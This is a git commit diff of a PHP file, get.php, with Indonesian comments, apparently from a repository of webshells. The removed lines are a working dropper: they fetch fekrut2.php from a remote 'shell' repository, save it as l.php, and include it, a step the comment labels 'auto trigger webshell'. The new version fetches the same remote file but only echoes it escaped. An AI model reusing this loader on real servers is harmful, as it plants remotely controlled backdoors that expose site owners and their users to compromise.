7d8cfa7637ec87c7225cad6921dcf14845fa7f61
masbrili <dimasbriliant2008@gmail.com>
2025-12-07 20:11:34 +0700

    Update get.php

--- get.php
+++ get.php
@@ -1,20 +1,12 @@
 <?php
 $url = 'https://raw.githubusercontent.com/masbrili/shell/refs/heads/main/fekrut2.php';
 
-$target = __DIR__ . '/l.php';
-
-// Ambil isi kode dari URL
-$payload = file_get_contents($url);
-if ($payload === false) {
-    die('Gagal !');
+$data = file_get_contents($url);
+if ($data === false) {
+    die('Gagal mengambil data!');
 }
 
-if (file_put_contents($target, $payload)) {
-    echo "d berhasil disimpan ke: $target\n";
-
-    // Auto trigger webshell
-    include($target);
-} else {
-    echo "Gagal menyimpan d. Cek d d!\n";
-}
+// gunakan $data sebagai teks
+echo "Data berhasil dimuat (tanpa disimpan):\n";
+echo htmlspecialchars($data);
 ?>
